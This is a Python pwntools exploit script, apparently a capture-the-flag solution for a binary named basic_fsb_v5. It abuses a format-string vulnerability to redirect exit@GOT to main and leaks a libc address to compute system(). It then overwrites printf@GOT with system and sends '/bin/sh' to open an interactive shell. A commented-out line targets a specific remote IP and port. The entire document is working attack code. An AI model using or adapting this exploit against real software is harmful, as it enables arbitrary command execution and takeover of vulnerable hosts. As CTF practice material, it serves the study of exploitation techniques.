from pwn import *
'''
main : 0x400676
exit : 0x400566
printf : 0x400520
'''
context.clear(log_level='debug', os='linux', arch='amd64')
p = process("./basic_fsb_v5")
# p = remote("141.164.39.45", 8005)
e = ELF("./basic_fsb_v5")
# libc = ELF("./libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

main = e.symbols['main']
exit_got = e.got['exit']
printf_got = e.got['printf']
oneshot = [0x4f2a5, 0x4f302, 0x10a2fc]

log.info('exit@got ' + hex(exit_got))
log.info('main ' + hex(main))

main_low = main & 0xffff
main_middle = (main >> 16) & 0xffff

low = main_low
if main_middle > main_low:
    middle = main_middle - main_low
else:
    middle = 0x10000 + main_middle - main_low

log.success('============ exit_got -> main ============')

payload = ''
payload += '%{}c'.format(e.sym['main'])
payload += '%9$hn'
# payload += '%{}c'.format(middle)
# payload += '%11$hn'
payload += '%41$p'
payload += b'A' * (8 - (len(payload) % 8 ))

payload += p64(exit_got)
payload += p64(exit_got + 2)

pause()
p.send(payload)

p.recvuntil('0x')
leak = int(p.recv(12), 16)
libc_base = leak - libc.sym['__libc_start_main'] - 231
system = libc_base + libc.sym['system']
log.success('============ leak libc_base ============')
log.info('__libc_start_main : {}'.format(hex(leak)))
log.info('libc_base : {}'.format(hex(libc_base)))
log.info('system : {}'.format(hex(system)))

system_low = system & 0xffff
system_middle = ( system >> 16 ) & 0xffff
system_hight = ( system >> 32) & 0xffff

low = system_low
if system_middle > system_low:
    middle = system_middle - system_low
else:
    middle = 0x10000 + system_middle - system_low
if system_hight > system_middle:
    hight = system_hight - system_middle
else:
    hight = 0x10000 + system_hight - system_middle

payload = ''
payload += '%{}c'.format(low)
payload += '%10$hn'
payload += '%{}c'.format(middle)
payload += '%11$hn'
payload += '%{}c'.format(hight)
payload += '%12$hn'
payload += 'A' * (8 - ((len(payload)) % 8))

payload += p64(printf_got)
payload += p64(printf_got + 2)
payload += p64(printf_got + 4)

pause()
p.send(payload)

pause()
p.send('/bin/sh\x00')

p.interactive()